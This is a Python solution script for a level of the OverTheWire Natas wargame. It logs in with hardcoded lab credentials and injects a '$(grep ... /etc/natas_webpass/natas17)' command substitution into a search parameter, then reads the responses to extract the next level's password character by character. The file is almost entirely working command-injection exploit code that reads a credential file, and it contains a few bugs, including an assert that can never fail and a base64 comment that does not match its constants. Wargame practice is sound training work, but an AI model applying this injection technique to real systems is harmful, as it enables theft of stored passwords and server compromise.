# coding=utf-8
import base64

import requests
from bs4 import BeautifulSoup

USERNAME = 'natas16:'.encode()
PASSWORD = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'.encode()
URL = 'http://natas16.natas.labs.overthewire.org'
CHARS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
NEXT_LEVEL_PASSWORD = ''
SINGLE_VALUE_GREP_RETURN = 'griddles'


# Output:\n<pre>\n</pre>

def connect():
    global headers
    base_encoded_auth = base64.b64encode(USERNAME + PASSWORD).decode('utf-8')
    print(base_encoded_auth)  # bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==
    headers = {'Authorization': 'Basic {0}'.format(base_encoded_auth)}
    response = requests.get(URL, headers=headers)
    assert (response.status_code != requests.codes.ok, "Can't connect")
    # import ipdb;ipdb.set_trace()
    # the_page_output = response.text
    # print(the_page_output)


def select_chars():
    parsed_chars = ''
    for char in CHARS:
        response = requests.get(
            URL + '?needle=$(grep ' + char + ' /etc/natas_webpass/natas17)' + SINGLE_VALUE_GREP_RETURN,
            headers=headers)
        # print(response.text)
        html_response_parser = BeautifulSoup(response.content, 'html.parser')  # .get_text
        # next required to read div content
        content_in_question = html_response_parser.find("div", {"id": "content"}).pre.next.encode()
        stripped_whitespace_content = content_in_question.decode('UTF-8').replace('\n', '')
        match_against_interested_string = stripped_whitespace_content == SINGLE_VALUE_GREP_RETURN
        if not match_against_interested_string:
            parsed_chars += char
    print('Characters Used: ' + parsed_chars)
    print('Starting brute force...')
    return parsed_chars


def brute_force(selected_chars_inner, next_level_password):
    # Assuming password is 32 characters long
    for i in range(32):
        for char in selected_chars_inner:
            req = requests.get(
                URL + '?needle=$(grep ^' + next_level_password + char + ' /etc/natas_webpass/natas17)' + SINGLE_VALUE_GREP_RETURN,
                headers=headers)
            html_response_parser2 = BeautifulSoup(req.content, 'html.parser')  # .get_text
            # next required to read div content
            content_in_question = html_response_parser2.find("div", {"id": "content"}).pre.next.encode()
            stripped_whitespace_content = content_in_question.decode('UTF-8').replace('\n', '')
            match_against_interested_string = stripped_whitespace_content == SINGLE_VALUE_GREP_RETURN

            if not match_against_interested_string:
                next_level_password += char
                print('Password: ' + next_level_password + '*' * int(32 - len(next_level_password)))
                break


connect()
selected_chars = select_chars()
brute_force(selected_chars, NEXT_LEVEL_PASSWORD)
print('Done')  # 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
